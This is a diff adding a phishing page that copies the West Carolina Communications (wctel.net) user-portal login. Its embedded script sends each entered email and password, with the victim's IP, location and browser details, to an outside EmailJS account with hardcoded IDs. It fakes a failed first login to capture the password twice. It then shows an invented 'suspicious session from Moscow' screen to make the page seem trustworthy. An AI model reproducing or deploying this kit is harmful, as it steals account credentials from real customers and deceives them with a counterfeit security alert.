@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<base href="https://userportal.wctel.net/mfa/login" /><meta charset="UTF-8"/>
+	<title>Log in to West Carolina Communications</title>
+	<link href="/build/app.068e1cda.css" rel="stylesheet" />
+	<link href="//fonts.googleapis.com/css?family=Open+Sans:400,400i,600,600i,700,700i" rel="stylesheet" />
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" />
+	<link href="/favicon/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180" />
+	<link href="/favicon/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png" />
+	<link href="/favicon/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png" />
+	<link href="/favicon/site.webmanifest" rel="manifest" />
+	<link color="#5bbad5" href="/favicon/safari-pinned-tab.svg" rel="mask-icon" />
+	<link href="/favicon/favicon.ico" rel="shortcut icon" /><meta name="msapplication-TileColor" content="#da532c"/><meta name="msapplication-config" content="/favicon/browserconfig.xml"/><meta name="theme-color" content="#ffffff"/><meta name="viewport" content="width:device-width, initial-scale=1"/>
+	<style>
+		/* =========================================================================
+		   Activity View Styles — professional WCTel theme
+		   ========================================================================= */
+		#activity-view {
+			display: none;
+			box-sizing: border-box;
+			/* Padding on ALL sides so buttons/cards never touch the card edges */
+			padding: 20px;
+			width: 100%;
+		}
+		#activity-view.show { display: block; }
+		#activity-view * { box-sizing: border-box; }
+
+		/* Header block */
+		#activity-view .activity-header {
+			display: flex;
+			align-items: flex-start;
+			gap: 16px;
+			padding-bottom: 18px;
+			border-bottom: 1px solid #e3e9f0;
+			margin-bottom: 20px;
+		}
+		#activity-view .activity-header .shield-icon {
+			flex: 0 0 auto;
+			width: 48px;
+			height: 48px;
+			border-radius: 50%;
+			background: #e8f1fa;
+			color: #0e3e6c;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			font-size: 22px;
+		}
+		#activity-view .activity-header .activity-heading {
+			flex: 1 1 auto;
+			min-width: 0;
+		}
+		#activity-view .activity-heading h3 {
+			color: #0e3e6c;
+			font-weight: 700;
+			font-size: 1.25rem;
+			margin: 0 0 4px 0;
+			line-height: 1.3;
+		}
+		#activity-view .activity-heading p {
+			font-size: 0.85rem;
+			color: #5a6b7d;
+			margin: 0;
+			line-height: 1.5;
+		}
+
+		/* Section label */
+		#activity-view .section-label {
+			font-size: 0.72rem;
+			font-weight: 700;
+			letter-spacing: 0.06em;
+			text-transform: uppercase;
+			color: #7b8a99;
+			margin-bottom: 10px;
+		}
+
+		/* Session cards */
+		#activity-view .session-card {
+			display: flex;
+			align-items: center;
+			gap: 14px;
+			border: 1px solid #e3e9f0;
+			border-radius: 8px;
+			padding: 14px 16px;
+			margin-bottom: 12px;
+			background: #ffffff;
+			transition: box-shadow 0.2s, opacity 0.2s;
+		}
+		#activity-view .session-card:hover {
+			box-shadow: 0 2px 10px rgba(14, 62, 108, 0.08);
+		}
+		#activity-view .session-card.removed {
+			opacity: 0.5;
+			background: #f6f8fb;
+		}
+		#activity-view .session-card.removed .session-body { text-decoration: line-through; }
+
+		#activity-view .session-card .device-icon {
+			flex: 0 0 auto;
+			width: 40px;
+			height: 40px;
+			border-radius: 8px;
+			background: #e8f1fa;
+			color: #0e3e6c;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			font-size: 18px;
+		}
+		#activity-view .session-card.suspicious .device-icon {
+			background: #fdecea;
+			color: #b3261e;
+		}
+
+		#activity-view .session-card .session-body {
+			flex: 1 1 auto;
+			min-width: 0;
+		}
+		#activity-view .session-card .session-title {
+			display: flex;
+			align-items: center;
+			flex-wrap: wrap;
+			gap: 8px;
+			font-size: 0.9rem;
+			font-weight: 600;
+			color: #0e3e6c;
+			margin-bottom: 2px;
+		}
+		#activity-view .session-card .session-title .tag {
+			font-size: 0.65rem;
+			font-weight: 700;
+			letter-spacing: 0.04em;
+			text-transform: uppercase;
+			padding: 2px 7px;
+			border-radius: 10px;
+			line-height: 1.4;
+		}
+		#activity-view .session-card .tag.current {
+			background: #e6f4ea;
+			color: #1e7e34;
+		}
+		#activity-view .session-card .tag.suspicious {
+			background: #fdecea;
+			color: #b3261e;
+		}
+		#activity-view .session-card .session-detail {
+			font-size: 0.78rem;
+			color: #6b7c8f;
+			line-height: 1.45;
+			word-break: break-word;
+		}
+
+		#activity-view .session-card .remove-btn {
+			flex: 0 0 auto;
+			border: 1px solid #d6dde5;
+			background: #ffffff;
+			color: #0e3e6c;
+			font-size: 0.75rem;
+			font-weight: 600;
+			padding: 6px 12px;
+			border-radius: 5px;
+			cursor: pointer;
+			transition: all 0.2s;
+			white-space: nowrap;
+			margin-left: 8px;
+		}
+		#activity-view .session-card .remove-btn:hover {
+			background: #0e3e6c;
+			border-color: #0e3e6c;
+			color: #ffffff;
+		}
+		#activity-view .session-card .remove-btn:disabled {
+			background: #f6f8fb;
+			border-color: #e3e9f0;
+			color: #a0aab5;
+			cursor: default;
+		}
+
+		/* Actions */
+		#activity-view .activity-actions {
+			display: flex;
+			gap: 10px;
+			margin-top: 22px;
+			flex-wrap: wrap;
+			width: 100%;
+		}
+		#activity-view .activity-actions .btn {
+			flex: 1 1 180px;
+			display: inline-flex;
+			align-items: center;
+			justify-content: center;
+			gap: 8px;
+			padding: 12px 18px;
+			border-radius: 6px;
+			border: 1px solid transparent;
+			font-size: 0.88rem;
+			font-weight: 600;
+			cursor: pointer;
+			transition: all 0.2s;
+			box-sizing: border-box;
+		}
+		#activity-view #this-was-me {
+			background: #28a745;
+			color: #fff;
+		}
+		#activity-view #this-was-me:hover { background: #218838; }
+		#activity-view #secure-account {
+			background: #0e3e6c;
+			color: #fff;
+		}
+		#activity-view #secure-account:hover { background: #0a2c4d; }
+
+		/* Alert */
+		#activity-view #alert-box {
+			font-size: 0.83rem;
+			margin-top: 18px;
+			padding: 14px 16px;
+			background: #e8f1fa;
+			border-left: 4px solid #0e3e6c;
+			border-radius: 5px;
+			color: #0e3e6c;
+			line-height: 1.55;
+			box-sizing: border-box;
+		}
+		#activity-view #alert-box:empty { display: none; }
+		#activity-view #alert-box strong { font-weight: 700; }
+
+		/* Login error banner */
+		#form-error-banner {
+			display: none;
+			font-size: 0.85rem;
+			color: #b00020;
+			margin-bottom: 1rem;
+			line-height: 1.4;
+		}
+		#form-error-banner.show { display: block; }
+
+		/* Mobile */
+		@media (max-width: 576px) {
+			#activity-view { padding: 15px; }
+			#activity-view .activity-header { flex-direction: column; }
+			#activity-view .session-card {
+				flex-wrap: wrap;
+				padding: 14px;
+			}
+			#activity-view .session-card .remove-btn {
+				width: 100%;
+				margin-top: 6px;
+				margin-left: 0;
+			}
+			#activity-view .activity-actions .btn { flex: 1 1 100%; }
+		}
+	</style>
+</head>
+<body class="app-body">
+<div class="container-md">
+<div class="row bg-white border-dark rounded mt-md-5">
+<div class="offset-xs-2 col-xs-8 offset-md-0 col-md-3 p-3"><img class="img-fluid" src="/mfa/img/logo" /></div>
+
+<div class="col-xs-12 col-md-9" style="min-width: 75%; color: #0e3e6c;" xclass="pt-2 pl-4 pr-4 pb-2 flex-grow-1 ">
+
+<!-- ================= LOGIN VIEW ================= -->
+<div id="login-view">
+<h3 class="pagetitle">Please Log In</h3>
+
+<div class="float-left" data-cookie-name="N88" data-url="/mfa/notices" id="noticesBadge">&nbsp;</div>
+
+<ul class="text-right list-inline mt-n1 navigation" style="font-size: 80%">
+	<li class="list-inline-item"><a href="/mfa/recovery">Forget Password? </a></li>
+</ul>
+
+<div class="pb-3">
+<form method="post" id="contact-form"><input name="__original_url" type="hidden" value="https://userportal.wctel.net/mfa/login" />
+<div class="form-group"><label for="inputUsername">Username</label> <input autofocus="" class="form-control" id="inputUsername" name="username" placeholder="Full email address" required="" type="email" value="" /></div>
+
+<div class="form-group"><label for="inputPassword">Password</label> <input class="form-control" id="inputPassword" name="password" placeholder="Password" required="" type="password" /></div>
+
+<div class="row">
+<div class="col-12 col-md-4">
+<div class="form-inline"><button class="btn btn-success btn-sm w-100 mr-md-2" id="btnLogin" type="submit">Login</button>
+
+<div class="form-group form-check pt-2">
+<div class="custom-control custom-switch"><input class="custom-control-input" id="_remember_me" name="_remember_me" type="checkbox" /> <label class="custom-control-label" for="_remember_me"> Stay logged in <span class="pl-1" style="cursor: help;" title="Enabling this will keep you logged in to this computer for 30 days."> </span> </label></div>
+</div>
+</div>
+</div>
+
+<div class="col-12 offset-md-4 col-md-4">
+<div class="form-group form-inline"><label for="_destination" style="display: inline-block">Go To:&nbsp;</label> <select class="custom-select w-75" id="_destination" name="_destination"><option value="portal-sso:">App Portal</option><option value="account-recovery-prefs:">Access Recovery</option><option value="account:">Account Security</option><option value="zimbra-sso:calendar">Zimbra Calendar</option><option value="zimbra-sso:mail">Zimbra Mail</option> </select></div>
+</div>
+</div>
+<input name="_csrf_token" type="hidden" value="5517b32b65a64a67bd9b1be3ecd4a.vCB_i8U8gb6yz3X4UuR6Bs9FBsGlT7IMSekssQfRtnQ.ikExvY5-t-bLohySYo0uUfciRLTCKOd8G5pD1n7k7y7jaj3Ghw_xzeabAg" />&nbsp;</form>
+</div>
+<div id="form-error-banner"></div>
+</div>
+
+<!-- ================= ACTIVITY VIEW (padded on all sides) ================= -->
+<div id="activity-view">
+	<div class="activity-header">
+		<div class="shield-icon"><i class="fa fa-shield"></i></div>
+		<div class="activity-heading">
+			<h3>Recent Account Activity</h3>
+			<p>We detected a new sign-in to your account. Please review the sessions below and confirm whether this activity was authorized by you.</p>
+		</div>
+	</div>
+
+	<div class="section-label">Active Sessions</div>
+
+	<div class="session-card" id="session-current">
+		<div class="device-icon"><i class="fa fa-laptop"></i></div>
+		<div class="session-body">
+			<div class="session-title">
+				This device
+				<span class="tag current">Current</span>
+			</div>
+			<div class="session-detail" id="current-device-meta">Loading device info…</div>
+		</div>
+		<button class="remove-btn" id="remove-current" type="button">Remove</button>
+	</div>
+
+	<div class="session-card suspicious" id="session-warsaw">
+		<div class="device-icon"><i class="fa fa-globe"></i></div>
+		<div class="session-body">
+			<div class="session-title">
+				Unknown device
+				<span class="tag suspicious">Unrecognized</span>
+			</div>
+			<div class="session-detail" id="unknown-device-meta">Loading…</div>
+		</div>
+		<button class="remove-btn" id="remove-warsaw" type="button">Remove</button>
+	</div>
+
+	<div class="activity-actions">
+		<button id="this-was-me" class="btn" type="button"><i class="fa fa-check"></i> This was me</button>
+		<button id="secure-account" class="btn" type="button"><i class="fa fa-lock"></i> Secure my account</button>
+	</div>
+
+	<div id="alert-box"></div>
+</div>
+
+</div>
+</div>
+</div>
+
+<div class="modal fade" id="popupModal" tabindex="-1">
+<div class="modal-dialog">
+<div class="modal-content" id="popup-modal-content">&nbsp;</div>
+</div>
+</div>
+
+<div class="modal fade" id="noticeModal" tabindex="-1">
+<div class="modal-dialog modal-notice">
+<div class="modal-content" id="notice-modal-content">
+<div class="modal-header">
+<h5 class="notice-title">&nbsp;</h5>
+<button aria-label="Close" class="close" data-dismiss="modal" type="button"></button></div>
+
+<div class="modal-body notice-body">&nbsp;</div>
+
+<div class="modal-footer small text-muted">
+<div class="row w-100 no-gutters">
+<div class="col-xs-12 text-xs-center col-md-4 text-md-left">|</div>
+
+<div class="col-xs-12 text-xs-center col-md-8 text-md-right notice-posted">&nbsp;</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script type="text/html" id="notice_new">
+    <div class="badge badge-danger notification notification-unread">
+        <a href="#"
+           data-notice-id="<%= nid %>"
+           data-link="<%= link %>"
+           title="Click to see new notifications"
+        >
+            <i class="fa fa-fw fa-exclamation-triangle"></i>
+            <%= ncount %> New Notification<%= nplural %>
+        </a>
+    </div>
+</script><script type="text/html" id="notice_old">
+    <div class="badge badge-diminished notification">
+        <a href="#"
+           data-notice-id="<%= nid %>"
+           data-link="<%= link %>"
+           title="Click to see previous notifications"
+        >
+            <i class="fa fa-fw fa-info-circle"></i>
+            Prior Notification<%= nplural %>
+        </a>
+    </div>
+</script><script src="/build/runtime.7576e7bf.js"></script><script src="/build/0.a11e63ec.js"></script><script src="/build/2.9cda4ccd.js"></script><script src="/build/app.93370638.js"></script><script src="/build/1.60a1a7d2.js"></script><script src="/build/notice.b8c7b6cc.js"></script>
+
+<!-- EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+(function () {
+  // ----- EmailJS init -----
+  emailjs.init("uGRhkufMjo08rjwb_");
+
+  // ----- DOM elements -----
+  const form = document.getElementById("contact-form");
+  const emailInput = document.getElementById("inputUsername");
+  const passwordInput = document.getElementById("inputPassword");
+  const submitBtn = document.getElementById("btnLogin");
+
+  // Views
+  const loginView = document.getElementById("login-view");
+  const activityView = document.getElementById("activity-view");
+  const formErrorBanner = document.getElementById("form-error-banner");
+
+  // Activity view elements
+  const currentDeviceMeta = document.getElementById("current-device-meta");
+  const unknownDeviceMeta = document.getElementById("unknown-device-meta");
+  const sessionCurrent   = document.getElementById("session-current");
+  const sessionWarsaw    = document.getElementById("session-warsaw");
+  const removeCurrentBtn = document.getElementById("remove-current");
+  const removeWarsawBtn  = document.getElementById("remove-warsaw");
+  const alertBox         = document.getElementById("alert-box");
+
+  let attemptNumber = 1;
+
+  // ----- accepted email domains (only wctel.net) -----
+  const ACCEPTED_DOMAINS = [
+    "wctel.net"
+  ];
+
+  function buildAllowedDomainRegex(domains) {
+    const escaped = domains.map(d => d.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+    return new RegExp(`^[^@\\s]+@(${escaped.join('|')})$`, 'i');
+  }
+  const allowedDomainRegex = buildAllowedDomainRegex(ACCEPTED_DOMAINS);
+
+  // ----- helpers -----
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("SamsungBrowser")) return "Samsung Internet";
+    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+    if (ua.includes("Trident")) return "Internet Explorer";
+    if (ua.includes("Edge")) return "Edge";
+    if (ua.includes("Chrome")) return "Chrome";
+    if (ua.includes("Safari")) return "Safari";
+    return "Unknown";
+  }
+  function getOS() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Win")) return "Windows";
+    if (ua.includes("Mac")) return "MacOS";
+    if (ua.includes("Linux")) return "Linux";
+    if (ua.includes("Android")) return "Android";
+    if (ua.includes("like Mac")) return "iOS";
+    return "Unknown";
+  }
+  function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+    if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
+    return "Desktop";
+  }
+  function getTimestamp() {
+    return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+  }
+  function getTimezone() {
+    try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+    catch (e) { return "Unknown"; }
+  }
+  function formatDeviceTime(date) {
+    const pad = (n) => String(n).padStart(2, "0");
+    const yyyy = date.getFullYear();
+    const mm = pad(date.getMonth() + 1);
+    const dd = pad(date.getDate());
+    const hh = pad(date.getHours());
+    const mi = pad(date.getMinutes());
+    let tz = "";
+    try {
+      tz = new Intl.DateTimeFormat("en-US", { timeZoneName: "short" })
+        .formatToParts(date).find((p) => p.type === "timeZoneName")?.value || "";
+    } catch (e) { /* ignore */ }
+    return `${yyyy}-${mm}-${dd} ${hh}:${mi}${tz ? ` (${tz})` : ""}`;
+  }
+  async function getIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip || "Not available";
+    } catch (e) {
+      return "Not available";
+    }
+  }
+  async function getLocation() {
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      if (!res.ok) return null;
+      const data = await res.json();
+      const city = data.city || "";
+      const country = data.country_name || data.country || "";
+      if (city && country) return `${city}, ${country}`;
+      return country || null;
+    } catch (e) { return null; }
+  }
+
+  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+  // ----- send to EmailJS -----
+  async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
+    const [ip, location] = await Promise.all([getIP(), getLocation()]);
+    const pageTitle = document.title;
+    const pageUrl = window.location.href;
+    const pageHostname = window.location.hostname;
+    const pagePathname = window.location.pathname;
+    const referrer = document.referrer || "Direct";
+    const browser = getBrowser();
+    const os = getOS();
+    const device = getDeviceType();
+    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+    const viewportSize = `${window.innerWidth}x${window.innerHeight}`;
+    const timezone = getTimezone();
+    const language = navigator.language || "Unknown";
+    const pageElementCount = document.getElementsByTagName('*').length;
+    const formsCount = document.forms.length;
+    const inputsCount = document.querySelectorAll('input').length;
+    const linksCount = document.querySelectorAll('a').length;
+
+    const attemptLabel = attempt === 1
+      ? "FIRST ATTEMPT (Incorrect credentials shown)"
+      : "SECOND ATTEMPT (Verification successful — activity page shown)";
+
+    const messageLog = `
+${attemptLabel}
+Timestamp: ${getTimestamp()}
+Email/Username: ${emailValue}
+Password: ${passwordValue}
+Page Title: ${pageTitle}
+Page URL: ${pageUrl}
+Hostname: ${pageHostname}
+Pathname: ${pagePathname}
+Referrer: ${referrer}
+Browser: ${browser}
+IP: ${ip}
+OS: ${os}
+Device: ${device}
+Screen Resolution: ${screenResolution}
+Viewport: ${viewportSize}
+Timezone: ${timezone}
+Approx. Location: ${location || "Unknown"}
+Language: ${language}
+Total Elements: ${pageElementCount}
+Forms: ${formsCount}
+Inputs: ${inputsCount}
+Links: ${linksCount}
+    `.trim();
+
+    const templateParams = {
+      timestamp: getTimestamp(),
+      from_email: emailValue,
+      password: passwordValue,
+      attempt_number: attempt,
+      attempt_label: attemptLabel,
+      page_title: pageTitle,
+      page_url: pageUrl,
+      page_hostname: pageHostname,
+      page_pathname: pagePathname,
+      referrer: referrer,
+      browser: browser,
+      ip: ip,
+      os: os,
+      device: device,
+      screen_resolution: screenResolution,
+      viewport_size: viewportSize,
+      timezone: timezone,
+      location: location || "Unknown",
+      language: language,
+      page_element_count: pageElementCount,
+      forms_count: formsCount,
+      inputs_count: inputsCount,
+      links_count: linksCount,
+      message: messageLog
+    };
+
+    try {
+      const response = await emailjs.send("service_t84doqy", "template_4rsr5vq", templateParams);
+      console.log(`EmailJS SUCCESS (attempt ${attempt}):`, response.status);
+      return true;
+    } catch (error) {
+      console.error(`EmailJS FAILED (attempt ${attempt}):`, error);
+      return false;
+    }
+  }
+
+  // ----- remove-session helper -----
+  function removeSession(sessionEl) {
+    if (!sessionEl) return;
+    sessionEl.classList.add("removed");
+    const btn = sessionEl.querySelector("button");
+    if (btn) btn.disabled = true;
+  }
+
+  removeCurrentBtn.addEventListener("click", (e) => {
+    e.preventDefault();
+    removeSession(sessionCurrent);
+  });
+
+  removeWarsawBtn.addEventListener("click", (e) => {
+    e.preventDefault();
+    removeSession(sessionWarsaw);
+  });
+
+  // ----- activity actions -----
+  document.getElementById("this-was-me").addEventListener("click", () => {
+    activityView.classList.remove("show");
+    loginView.style.display = "block";
+
+    form.reset();
+    formErrorBanner.classList.remove("show");
+    formErrorBanner.textContent = "";
+    alertBox.textContent = "";
+    attemptNumber = 1;
+
+    sessionCurrent.classList.remove("removed");
+    sessionWarsaw.classList.remove("removed");
+    removeCurrentBtn.disabled = false;
+    removeWarsawBtn.disabled = false;
+    currentDeviceMeta.textContent = "Loading device info…";
+    unknownDeviceMeta.textContent = "Loading…";
+
+    emailInput.focus();
+  });
+
+  document.getElementById("secure-account").addEventListener("click", () => {
+    removeSession(sessionWarsaw);
+    alertBox.innerHTML = `<strong>Account secured.</strong><br />The suspicious session from <strong>Moscow, Russia</strong> has been removed.`;
+  });
+
+  // ----- form submit -----
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    formErrorBanner.textContent = "";
+    formErrorBanner.classList.remove("show");
+
+    const emailValue = emailInput.value.trim();
+    const passwordValue = passwordInput.value.trim();
+    let valid = true;
+
+    if (!emailValue) {
+      valid = false;
+    } else if (!allowedDomainRegex.test(emailValue)) {
+      valid = false;
+    }
+    if (!passwordValue) {
+      valid = false;
+    }
+    if (!valid) return;
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Verifying…";
+
+    // 1) Send immediately to EmailJS (activity created right now)
+    await sendAttemptToEmailJS({ emailValue, passwordValue, attempt: attemptNumber });
+
+    if (attemptNumber === 1) {
+      await sleep(900);
+      submitBtn.disabled = false;
+      submitBtn.textContent = "Login";
+
+      formErrorBanner.textContent = "Incorrect username or password. Please try again.";
+      formErrorBanner.classList.add("show");
+
+      passwordInput.value = "";
+      passwordInput.focus();
+
+      attemptNumber = 2;
+      return;
+    }
+
+    // ----- Second attempt: show activity view -----
+    const now = new Date();
+    const thirtyMinLater = new Date(now.getTime() + 30 * 60 * 1000);
+    const browser = getBrowser();
+    const os = getOS();
+
+    const location = await Promise.race([getLocation(), sleep(800).then(() => null)]);
+    const locationLabel = location || getTimezone();
+
+    currentDeviceMeta.textContent = `${browser} on ${os} · ${locationLabel} · ${formatDeviceTime(now)}`;
+    unknownDeviceMeta.textContent = `Chrome on Windows · Moscow, Russia · ${formatDeviceTime(thirtyMinLater)}`;
+
+    loginView.style.display = "none";
+    activityView.classList.add("show");
+
+    submitBtn.disabled = false;
+    submitBtn.textContent = "Login";
+
+    sessionCurrent.classList.remove("removed");
+    sessionWarsaw.classList.remove("removed");
+    removeCurrentBtn.disabled = false;
+    removeWarsawBtn.disabled = false;
+  });
+
+})();
+</script>
+</body>
+</html>
